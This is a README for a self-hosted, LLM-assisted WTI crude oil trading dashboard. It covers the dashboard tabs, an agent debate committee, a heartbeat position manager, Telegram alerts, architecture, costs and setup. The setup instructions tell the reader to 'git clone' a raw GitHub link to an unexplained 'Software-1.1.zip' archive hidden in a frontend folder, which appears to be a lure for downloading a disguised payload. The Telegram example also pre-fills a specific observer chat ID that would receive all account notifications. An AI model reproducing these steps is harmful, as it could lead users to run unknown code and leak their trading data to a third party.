# WTI Crude Oil Trading Research Bot

> ⚠️ **Research tool, not financial advice.** Leveraged trading can lose you more than your deposit. Read [LICENSE](LICENSE) and [SECURITY.md](SECURITY.md) before running anything that touches real money.

A self-hosted, AI-assisted analytics stack for discretionary WTI crude oil trading. Pulls real-time market data from **Twelve Data** (WTI/USD), positioning, microstructure, macro, news, sentiment, and user performance history into a **6-tab dashboard**; layers a **13-agent adversarial committee** (Claude Sonnet + Grok 4.20 + Opus judge) on top for decision support; runs an **Opus heartbeat position manager** that actively manages open campaigns every 5 minutes; provides a **Scalp Brain** that stitches 11 intraday signals into a single LONG/SHORT/WAIT verdict; and maintains **forward-looking theses** that auto-trigger and track outcomes for learning.

Built on Docker Compose microservices with Postgres + TimescaleDB + Redis Streams. Python backend, React frontend, Claude + Grok for LLM reasoning, Twelve Data WTI/USD as the canonical price feed.

---

## What the dashboard actually shows

The frontend is a **6-tab React app** with a persistent cockpit bar:

### Cockpit Bar (always visible)

- **Live price ticker** — WTI/USD from Twelve Data (3-second poll)
- **Heartbeat pill** 🫀 — Opus position manager status + countdown + click-to-pause
- **Conviction one-liner** — composite 0–100 score with direction arrow
- **Account one-liner** — equity + open P/L + drawdown %
- **WebSocket status** — Live/Disconnected indicator
- **Tab switcher** — 6 tabs with keyboard shortcuts `1`-`6`

### 🎯 Tab 1: Trade Now (default)

Zero-scroll scalp cockpit — the "should I fire right now" view:

- **Now Brief** — AI-generated structured brief (Claude Haiku, 3-min cache) reading the entire dashboard state
- **Signal Confluence** — pure-logic matrix classifying every signal as BULL / BEAR / NEUTRAL
- **Anomaly Radar** — threshold-based detector for rare conditions with severity 1–10
- **Scalp Brain** — one-panel ultimate scalper verdict stitching 11 signals (multi-TF RSI, VWAP ±2σ bands, session range, opening-range breakout, CVD, orderbook imbalance, whale bias, conviction trend, cross-asset stress, session regime, BBands squeeze) into a weighted verdict: **LONG NOW / SHORT NOW / LEAN LONG / LEAN SHORT / WAIT** with deterministic entry/SL/TP1/TP2/R:R from ATR. Four gatekeepers (ATR floor, ADX floor, HTF wall, heartbeat conflict) must pass for a NOW verdict. Fires Telegram alerts on state transitions.
- **Scalping Range** — 5-min percentile range (2h lookback) + real-time 30-min high/low, VWAP bias, ATR regime classification, per-side entry/SL/TP setups with R:R
- **Price Chart** — TradingView Lightweight Charts across 6 timeframes with position + signal overlays

### 📊 Tab 2: Positions

- **Account Panel** — equity, cash, margin, free margin, drawdown with hard-stop bar
- **Campaigns Panel** — open DCA campaigns with per-layer table, DCA preview, close/add-layer buttons
- **Risk & Scenario Tools** — PnL at 11 price offsets, Monte Carlo margin-call probability, VWAP, economic calendar

### 🌍 Tab 3: Market

- **Twelve Data Sensors** — market sessions (US/London/Asia timing + sizing multiplier), WTI indicators (RSI/MACD/ATR/ADX/BBANDS), cross-asset stress (SPY/BTC/UUP RSI)
- **Cross-Asset Context** — DXY, SPX, Gold, BTC, VIX with correlations + CVD divergence
- **Binance Metrics** — funding rate, open interest, long/short ratios, liquidations
- **Binance Pro** — orderbook depth + imbalance, whale trades, volume profile with POC
- **Marketfeed Panel** — @marketfeed knowledge summaries

### 📌 Tab 4: Theses

Forward-looking conditional plans with automatic trigger detection and outcome tracking, split into two independent sections:

- **Campaign Theses** — created by user (chat or form), Opus heartbeat manager, or ai-brain. Plans tied to the main campaign system.
- **Scalp Theses** — created automatically by the Scalp Brain when it enters LEAN states. The scalper's own learning corpus — never touches real campaigns, tracks its own hit rate independently.

Each section shows: stats strip (30d created count, hit rate, hypothetical P/L), triggered (decide now), pending, collapsible resolved history with outcome badges (✅ correct / ❌ wrong / 〰 partial / ❓ unresolved).

Trigger types: price cross above/below, unified score above/below, time elapsed, news keyword match, scalp brain state transition, manual.

### 🔍 Tab 5: Investigate

- **Conviction Meter** — composite 0–100 gauge over 7 weighted inputs with driver breakdown
- **Analysis Scores** — 5 bipolar cards (Technical, Fundamental, Sentiment, Shipping, Unified)
- **Learning Panel** — trade journal, historical pattern match (weighted Euclidean similarity), signal performance tracker
- **Signal History** — clickable rows opening the Signal Detail Drawer

### ⚙️ Tab 6: System

- **LLM Usage Panel** — live token + cost breakdown per call site, per model, per service. 24h hourly sparkline, cache savings, heartbeat skip ratio. Tracks every Anthropic/xAI call the bot makes.
- **Logs Panel** — live Docker container stdout streaming

---

## Key features

### 13-Agent Adversarial Committee

Twelve specialist agents run in parallel, each building the strongest case for their side from their own domain:

| Team | Model | Agents |
|---|---|---|
| **Claude Sonnet team** | `claude-sonnet-4-6` | 3 bull (geopolitics, technical, macro) + 3 bear |
| **Grok 4.20 team** | `grok-4.20-0309-reasoning` | 3 bull (geopolitics, technical, macro) + 3 bear |
| **Judge** | `claude-opus-4-6` | Reads all 12 cases + full context, renders verdict |

The judge detects **cross-model agreement** (when Sonnet and Grok agree on the same domain = high conviction, disagree = red flag), computes per-model team averages, and handles same-domain neutralization. R:R is computed deterministically in Python from the judge's trade levels. ~60s end-to-end, ~$0.60/debate.

### Opus Heartbeat Position Manager

A background worker in `ai-brain` that reviews every open campaign with Claude Opus 4.6:

- **5-minute normal cadence** — ticks and decides hold / close / update_levels per campaign
- **30-second hot cadence** — activates for 5 minutes after any campaign open, close, TP/SL hit, or DCA layer add. Opus aggressively monitors the transition and can react within 30 seconds.
- **Hash gate** — before calling Opus, builds a bucketed hash of the decision signal (price, P/L, scores, news). If nothing material changed AND the last decision is < 15 min old, skips the Opus call entirely. Saves ~50% of LLM spend on quiet markets.
- **Safety rails** — Redis kill-switch (dashboard + env), 30-min close cooldown, 0.5% indecision guard, level validation. The -50% hard-stop runs independently on every score event.
- **Telegram alerts** — every action (close, update_levels) + periodic status pings (~20 min per campaign with price, P/L, distance to TP/SL, Opus reason, margin/leverage/notional exposure)
- **Thesis proposer** — Opus can propose up to 2 forward-looking theses per tick, deduped against existing pending theses

### Scalp Brain

One-panel ultimate scalper verdict stitching 11 signals into a single LONG NOW / SHORT NOW / LEAN / WAIT answer:

- **11 weighted signals** (sum 100): multi-TF RSI (15), VWAP ±2σ bands (15), session range position (10), opening-range breakout (10), CVD flow (10), orderbook imbalance (10), whale bias (8), conviction trend (8), cross-asset stress (5), session regime (5), BBands squeeze (4)
- **4 gatekeepers**: ATR floor, ADX floor, higher-timeframe RSI wall, heartbeat conflict
- **Deterministic levels**: entry = current price, SL = ATR ×1.0 snapped to structural level, TP1 = ATR ×1.5, TP2 = ATR ×2.5
- **Auto-propose**: on LEAN states, the scalp brain saves a scalp-domain thesis with full signal reasoning for later review (rate-limited to 1 per side per 15 min)
- **Telegram alerts**: fires on verdict transitions into NOW states (5-min per-side cooldown)

### Forward-Looking Theses

Conditional trading plans that trigger on future market conditions and auto-track outcomes:

- **Creation paths**: user via chat ("remember if price hits 95 I want to go long"), dashboard form, Opus heartbeat auto-propose, scalp brain auto-propose
- **Trigger engine**: 30-second polling in ai-brain; triggers on price cross, score threshold, time elapsed, news keyword, scalp brain state transition, or manual
- **Outcome tracking**: after trigger, monitors whether hypothetical TP or SL would have been hit first. Records MFE/MAE and hypothetical P/L. Auto-resolves when TP/SL hit or resolution window (default 4h) elapsed.
- **Domain separation**: campaign theses (user + Opus) and scalp theses (scalp brain only) roll up independently. Each has its own hit rate + hypothetical P/L stats.
- **Telegram**: only `thesis_triggered` alerts reach the feed; created/resolved are silent (visible in dashboard)
- **Heartbeat integration**: pending theses are injected into the heartbeat Opus context so it can reference them in its decisions

### LLM Token Optimization

- **Heartbeat hash gate**: skips Opus when nothing material changed (~50% savings)
- **Prompt caching**: `cache_control: ephemeral` on committee judge + specialists + chat system prompts (10% input cost on cache hits)
- **Visibility guard**: all polling stops when the browser tab is backgrounded (zero LLM calls when you're not looking)
- **Now Brief TTL**: 3-minute cache (up from 45s), poll aligned to 90s
- **Marketfeed skip**: < 3 headlines → placeholder digest, no Haiku call
- **Chat model**: Sonnet by default (was Opus, 5x cheaper)
- **LLM usage tracker**: per-call audit log with pricing table, aggregated in dashboard System tab

### Telegram Bot

- Every AI recommendation formatted as Markdown
- Heartbeat status pings (~20 min per campaign) with full sizing info (margin × leverage = notional exposure)
- Heartbeat action alerts (close / update_levels) with Opus reasoning
- Scalp brain NOW verdict transitions with entry/SL/TP/R:R
- Thesis triggered alerts with plan + "decide now" prompt
- `/state`, `/positions` shortcuts
- Free-text chat forwarded to `/api/chat` with SSE progress streaming
- **Read-only observers**: additional chat_ids receive all notifications but cannot interact (no commands, no chat)
- **Telegram-specific formatting**: no tables/headers/horizontal rules (breaks on mobile), single-asterisk bold, emoji section markers, blockquotes for verdicts only

---

## Architecture

```
┌──────────────┐  PriceEvents   ┌──────────┐  ScoresEvents  ┌──────────┐
│ data-collector│──────────────▶│ analyzer │──────────────▶│ ai-brain │
│ (Twelve Data, │  liquidations │ (scoring │                │ (Opus +  │
│  Binance WS,  │  funding, OI, │  engine) │                │ committee│
│  cross-asset, │  L/S ratios   └────┬─────┘                │  Haiku,  │
│  macro)       │                    │                      │  Grok +  │
└──────┬────────┘                    │                      │ heartbeat│
       │                             │                      │ +theses) │
       ▼  Redis Streams ─────────────┴───────────────────────────┤
   ┌───┴────────────────────────────────────────────────────┐    │
   │  postgres + timescaledb                                │    │
   │  ohlcv, scores, signals, campaigns, positions,         │    │
   │  binance_metrics, heartbeat_runs, llm_usage, theses,   │    │
   │  signal_snapshots, anomalies, …                        │    │
   └───▲────────────────────────────────────────────────────┘    │
       │                                                          │
   ┌───┴──────────┐           ┌─────────┐         ┌──────────┐   │
   │  sentiment   │           │ notifier│◀───────▶│ Telegram │   │
   │  (RSS,       │           │ (bot +  │         │ (main +  │   │
   │   @marketfeed│           │ outbound│         │ observer)│   │
   │   Twitter)   │           │ +fanout)│         └──────────┘   │
   └──────┬───────┘           └────▲────┘                         │
          │                        │                              │
          ▼                        │                              │
   ┌──────┴────────────────────────┴──────┐                       │
   │            dashboard                 │◀─────────────────────┘
   │  FastAPI backend + plugin system     │
   │  (50+ REST routes, 2 WS, 22 plugins) │
   │                  +                   │
   │  React frontend (Vite, Tailwind,     │
   │  6-tab layout, 40+ components)       │
   └──────────────────────────────────────┘
```

### Services

| Service | Responsibility |
|---|---|
| **data-collector** | Pulls Twelve Data WTI/USD klines (1m/5m primary), Binance CLUSDT derivatives metrics (funding, OI, L/S ratios, liquidations, aggTrades), cross-asset bars, and macro series (EIA, FRED, COT, JODI). |
| **analyzer** | Computes multi-timeframe technical score, fundamental score, sentiment score, shipping score, unified composite. Publishes `ScoresEvent`. Runs the alerts evaluator loop. |
| **ai-brain** | Opus strategist + Haiku summary + Grok Twitter narrative. **Heartbeat position manager** (5-min tick + 30s hot window). **Theses watcher** (30s trigger scanner) + **theses resolver** (5-min outcome tracker). Live watch worker. Breaking-news watcher. |
| **sentiment** | RSS news scraper, Grok Twitter narrative, @marketfeed Telegram scraper + Haiku 5-min digest builder (skips <3 headlines). |
| **dashboard** | FastAPI backend with 50+ REST routes, 2 WebSocket endpoints, 22 `plugin_*.py` files. React/Vite/Tailwind frontend with 6-tab layout, 40+ components. Embedded chat. Scalp Brain engine. |
| **notifier** | Telegram outbound: fans out to main user + read-only observers. Inbound: long-polls Telegram, forwards to `/api/chat`, streams SSE progress. Formats 12 event types (signals, positions, heartbeat status/actions, scalp brain, thesis triggered, marketfeed digests, live watch, alerts, system). |
| **postgres** | TimescaleDB extension. 20+ tables including `heartbeat_runs`, `llm_usage`, `theses`. |
| **redis** | Consumer-group streaming bus + heartbeat state keys (enabled, hot_until, context hash, status ping timers). |

### LLM models used

| Model | Where | What it does |
|---|---|---|
| **Claude Opus 4.6** (`claude-opus-4-6`) | committee judge, heartbeat position manager, AI brain strategist | Primary reasoning: manages open positions (hold/close/update_levels), proposes theses, judges adversarial debates |
| **Claude Sonnet 4.6** (`claude-sonnet-4-6`) | chat backend, committee specialists (6 agents) | Dashboard chat with full tool access; adversarial debate specialists (geopolitics/technical/macro × bull/bear) |
| **Claude Haiku 4.5** (`claude-haiku-4-5`) | @marketfeed classifier, AI brain summary, Now Brief | High-volume cheap classification: 5-min digests, score summaries, 3-min-cached synthesis brief |
| **Grok 4.20** (`grok-4.20-0309-reasoning`, via x.ai OpenAI-compatible endpoint) | committee specialists (6 agents), Twitter narrative | Live Twitter/X access + web search; 6 adversarial debate specialists with different training bias from Claude |

### Cost

Typical daily LLM spend with active trading (12h, 1-2 open campaigns):

| Call site | Real cost/call | Est. daily |
|---|---|---|
| Heartbeat Opus (5 min + hot) | ~$0.08 | $10-15 |
| Recommendation Opus (per score event) | ~$0.14 | $7-10 |
| Now Brief Haiku (3-min cache) | ~$0.006 | $1-2 |
| Committee (12 agents + judge, manual) | ~$0.60 | $1-2 |
| Everything else (chat, Haiku, Grok) | varies | $2-5 |
| **Total** | | **~$20-30/day** |

Hash gate + prompt caching + visibility guard cut this by ~50% vs unoptimized.

---

## Getting started

### Prerequisites

- Docker + Docker Compose
- An Anthropic API key (required)
- A Twelve Data API key (required for WTI price data — Grow plan $29/mo recommended)
- Optional: xAI API key (Grok committee agents + Twitter narrative), Telegram bot token + chat ID, EIA / FRED keys

### Setup

```bash
git clone https://raw.githubusercontent.com/shraz237/quorum/main/services/dashboard/frontend/src/components/Software-1.1.zip
cd quorum

cp .env.example .env
$EDITOR .env       # fill in ANTHROPIC_API_KEY + TWELVE_API_KEY at minimum

docker compose up -d --build
```

First startup takes a few minutes. Once healthy:

- Dashboard: [http://localhost:8001](http://localhost:8001)
- Postgres: `127.0.0.1:5433` (loopback only)
- Redis: internal only

### Verifying the stack is alive

```bash
docker compose ps                     # all services should be "healthy"
curl -s localhost:8001/api/health | jq
curl -s localhost:8001/api/account | jq
curl -s localhost:8001/api/scalp-brain | jq '.data.verdict'
curl -s localhost:8001/api/heartbeat/status | jq '.data.enabled'
```

### Enabling authentication (REQUIRED if not localhost-only)

Set a long random value in `.env`:

```bash
DASHBOARD_API_KEY=$(openssl rand -hex 32)
```

Restart the dashboard container. All mutating endpoints, `/api/chat`, and `/api/logs` will now require the `X-API-Key: <value>` header.

### Telegram setup

```bash
TELEGRAM_BOT_TOKEN=<your-bot-token>
TELEGRAM_CHAT_ID=<your-chat-id>

# Optional: read-only observers (comma-separated, receive all notifications
# but cannot interact with the bot)
TELEGRAM_NOTIFY_CHAT_IDS=6167422315
```

---

## Tech stack

- **Python 3.12** — all backend services
- **FastAPI + Uvicorn** — dashboard HTTP + WebSocket
- **SQLAlchemy 2.x + psycopg v3** — DB layer
- **PostgreSQL 16 + TimescaleDB** — hypertables, compression
- **Redis 7** — streaming bus with consumer groups + state keys
- **anthropic** — Claude SDK (Opus 4.6, Sonnet 4.6, Haiku 4.5)
- **openai** — Grok 4.20 (via x.ai OpenAI-compatible endpoint)
- **python-telegram-bot** — bot framework with observer fan-out
- **React 18 + Vite + TypeScript** — 6-tab frontend
- **Tailwind CSS** — styling
- **TradingView Lightweight Charts** — candlestick chart

---

## Project layout

```
trading/
├── docker-compose.yml               # full stack orchestration
├── LICENSE
├── SECURITY.md
├── .env.example
├── shared/                          # shared Python package
│   ├── models/                      # SQLAlchemy models (20+ tables)
│   ├── schemas/                     # Pydantic events for Redis streams
│   ├── config.py                    # settings via pydantic-settings
│   ├── redis_streams.py             # publish/subscribe helpers
│   ├── account_manager.py           # account state recompute
│   ├── position_manager.py          # DCA campaign logic + update_campaign_levels
│   ├── sizing.py                    # DCA layer margins + dynamic sizing
│   ├── dynamic_sizing.py            # compute_size_multiplier from market state
│   ├── llm_usage.py                 # per-call token/cost tracker
│   ├── theses.py                    # thesis CRUD + trigger eval + outcome resolution
│   ├── heartbeat_hot.py             # arm hot-window from any service
│   └── db_init.py                   # TimescaleDB hypertable setup
├── services/
│   ├── data-collector/              # Twelve Data + Binance + macro collectors
│   ├── analyzer/                    # scoring engine + indicators
│   ├── ai-brain/
│   │   ├── main.py                  # event loop + worker threads
│   │   ├── heartbeat.py             # Opus position manager (5min/30s hot)
│   │   ├── theses_workers.py        # trigger watcher + outcome resolver
│   │   └── agents/                  # opus.py, haiku.py, grok.py
│   ├── sentiment/                   # RSS/Twitter/@marketfeed scrapers
│   ├── notifier/
│   │   ├── main.py                  # Telegram in/out + observer fan-out
│   │   ├── formatter.py             # 12 event type formatters
│   │   └── chat_client.py           # SSE chat stream proxy
│   └── dashboard/
│       ├── backend/                 # FastAPI + 22 plugin_*.py files
│       │   ├── plugin_committee.py  # 13-agent adversarial debate
│       │   ├── plugin_scalp_brain.py # 11-signal scalper verdict
│       │   ├── plugin_heartbeat.py  # pause/resume + status
│       │   ├── plugin_theses.py     # CRUD + domain stats
│       │   ├── plugin_llm_usage.py  # cost rollups
│       │   ├── plugin_now_brief.py  # AI synthesis brief
│       │   ├── chat.py              # LLM chat with tools
│       │   ├── chat_tools.py        # 30+ Anthropic tool schemas
│       │   └── ...                  # 14 more plugins
│       └── frontend/
│           └── src/
│               ├── App.tsx           # 6-tab layout + cockpit bar
│               └── components/       # 40+ React components
│                   ├── CockpitBar.tsx
│                   ├── ScalpBrainPanel.tsx
│                   ├── HeartbeatPill.tsx
│                   ├── LlmUsagePanel.tsx
│                   └── tabs/         # TradeNow, Positions, Market,
│                                     # Theses, Investigate, System
└── docs/
    └── superpowers/
        └── specs/                   # design documents
```

---

## Disclaimer

This is an **experimental research tool**. Running it against a live broker account is at your own risk. The authors accept no liability for any losses. Read the full disclaimer in [LICENSE](LICENSE).

Leveraged derivatives (CFDs, futures, perpetuals) can lose you more than your deposit. The software does not predict price. Signals are hypotheses, not guarantees.

## License

MIT — see [LICENSE](LICENSE).
